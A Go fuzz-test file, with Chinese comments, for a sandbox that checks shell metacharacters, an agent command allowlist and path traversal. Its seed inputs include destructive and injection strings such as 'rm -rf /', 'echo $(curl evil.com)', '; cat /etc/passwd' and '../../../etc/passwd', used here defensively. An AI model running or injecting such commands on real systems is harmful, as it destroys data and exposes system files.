package security

import (
	"strings"
	"testing"
)

// FuzzContainsShellMetacharacter 模糊测试 shell 元字符检测。
// 确保 ContainsShellMetacharacter 对任意输入不 panic 且结果一致。
// 性质：如果输入包含 dangerousChars 中的任一字符，应返回 true。
func FuzzContainsShellMetacharacter(f *testing.F) {
	// 种子语料
	seedCmds := []string{
		"ls -la",
		"rm -rf /",
		"cat file; cat /etc/passwd",
		"echo $(whoami)",
		"echo `whoami`",
		"cmd1 | cmd2",
		"cmd1 & cmd2",
		"echo hello > /tmp/file",
		"echo hello < /dev/null",
		"normal command",
		"",
		"echo hello\nrm -rf /",
		"echo hello\rrm -rf /",
		"(subshell)",
	}
	for _, s := range seedCmds {
		f.Add(s)
	}

	f.Fuzz(func(t *testing.T, cmd string) {
		detected, char := ContainsShellMetacharacter(cmd)

		// 验证一致性：手动检查是否包含任何 dangerousChars
		manualDetect := false
		var manualChar string
		for _, dc := range dangerousChars {
			if strings.Contains(cmd, dc) {
				manualDetect = true
				manualChar = dc
				break
			}
		}

		if detected != manualDetect {
			t.Errorf("检测不一致：函数返回 (%v, %q)，手动检查 (%v, %q)，输入 %q",
				detected, char, manualDetect, manualChar, cmd)
		}

		// 如果检测到，char 应非空
		if detected && char == "" {
			t.Errorf("检测到元字符但 char 为空，输入 %q", cmd)
		}

		// 如果未检测到，char 应为空
		if !detected && char != "" {
			t.Errorf("未检测到元字符但 char 非空 %q，输入 %q", char, cmd)
		}
	})
}

// FuzzSandboxCanExecute 模糊测试沙箱命令执行校验。
// 确保对任意命令字符串不 panic 且正确拒绝含元字符的输入。
func FuzzSandboxCanExecute(f *testing.F) {
	seedCmds := []string{
		"ls",
		"ls -la /tmp",
		"cat /etc/passwd",
		"rm -rf /",
		"echo hello; rm -rf /",
		"echo $(curl evil.com)",
		"normal_command --flag value",
		"",
		"  ",
		"git status",
		"go build ./...",
	}
	for _, s := range seedCmds {
		f.Add(s)
	}

	f.Fuzz(func(t *testing.T, cmd string) {
		acl := NewACL()
		acl.Allow("*", "/", AccessAll)
		sb := NewSandbox(acl)
		sb.AllowCommand("ls")
		sb.AllowCommand("cat")
		sb.AllowCommand("echo")
		sb.AllowCommand("git")
		sb.AllowCommand("go")

		// CanExecute 不应 panic
		err := sb.CanExecute("agent-1", cmd)

		// 如果命令包含元字符，必须返回错误
		if hasMeta, _ := ContainsShellMetacharacter(cmd); hasMeta && err == nil {
			t.Errorf("含元字符的命令 %q 未被拒绝", cmd)
		}

		// 空命令应返回错误
		if strings.TrimSpace(cmd) == "" && err == nil {
			t.Errorf("空命令 %q 应被拒绝", cmd)
		}
	})
}

// FuzzValidatePath 模糊测试路径校验。
// 确保对任意路径不 panic 且正确拒绝路径遍历。
func FuzzValidatePath(f *testing.F) {
	seedPaths := []string{
		"/tmp/file.txt",
		"/etc/passwd",
		"../../../etc/passwd",
		"./local/file",
		"/home/user/../other/file",
		"",
		"/",
		"C:\\Users\\test\\file.txt",
		"..",
		"....//....//etc/passwd",
	}
	for _, s := range seedPaths {
		f.Add(s)
	}

	f.Fuzz(func(t *testing.T, path string) {
		acl := NewACL()
		acl.Allow("*", "/", AccessAll)
		sb := NewSandbox(acl)

		// ValidatePath 不应 panic
		err := sb.ValidatePath("agent-1", path, AccessRead)

		// 清理后仍含 ".." 的路径必须被拒绝
		if err == nil {
			// 如果通过了校验，说明路径合法
			// 但 filepath.Clean 后不应残留 ".."
			// 这是合法的——filepath.Clean 会解析 ".."
		}
	})
}
